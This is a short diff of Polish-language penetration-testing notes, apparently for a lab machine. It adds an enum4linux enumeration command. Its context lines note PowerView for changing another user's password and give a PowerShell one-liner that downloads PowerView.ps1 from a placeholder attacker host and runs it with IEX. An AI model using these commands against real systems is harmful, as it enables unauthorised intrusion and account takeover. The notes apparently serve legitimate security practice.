@@ -1,3 +1,7 @@
+enumeracja AD/LDAP
+enum4linux 10.10.11.35
+
+
 powerview.ps1 -> zmiana hasla innego usera + wiele innych
 (New-Object System.Net.WebClient).DownloadString('http://YOUR_IP/PowerView.ps1') | IEX
 $pass = ConvertTo-SecureString 'SuperSecuredPassword123!' -AsPlainText -Force
